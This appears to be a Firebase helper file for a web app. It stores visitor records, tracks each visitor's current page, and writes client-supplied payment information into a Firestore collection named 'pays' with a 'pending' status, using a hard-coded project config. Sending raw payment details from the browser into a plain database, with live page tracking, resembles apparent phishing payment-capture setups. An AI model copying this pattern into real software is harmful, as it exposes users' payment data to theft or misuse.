2// firebase.js
import { getApp, getApps, initializeApp } from 'firebase/app';
import { getDatabase } from 'firebase/database';
import { doc, getFirestore, setDoc } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: "AIzaSyAlTDyrStDLFU-4gOisNqI3k5DQe5SVJVE",
  authDomain: "mnmyf-e2a1f.firebaseapp.com",
  projectId: "mnmyf-e2a1f",
  storageBucket: "mnmyf-e2a1f.firebasestorage.app",
  messagingSenderId: "423118881361",
  appId: "1:423118881361:web:03e76378f19dc9e7f9ae70",
  measurementId: "G-B1CQC966C2"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

export async function addData(data: any) {
  localStorage.setItem('visitor', data.id);
  try {
    const docRef = await doc(db, 'pays', data.id!);
    await setDoc(docRef,   { ...data, createdDate: new Date().toISOString() },{merge:true});

    console.log('Document written with ID: ', docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error('Error adding document: ', e);
    // You might want to show an error message to the user here
  }
}

export const handleCurrentPage=(page:string)=>{
const visitorId=localStorage.getItem('visitor')
addData({id:visitorId,currentPage:page})
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem('visitor');
    if (visitorId) {
      const docRef = doc(db, 'pays', visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: 'pending' },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
    }
  } catch (error) {
    console.error('Error adding document: ', error);
    alert('Error adding payment info to Firestore');
  }
};
export { db,database };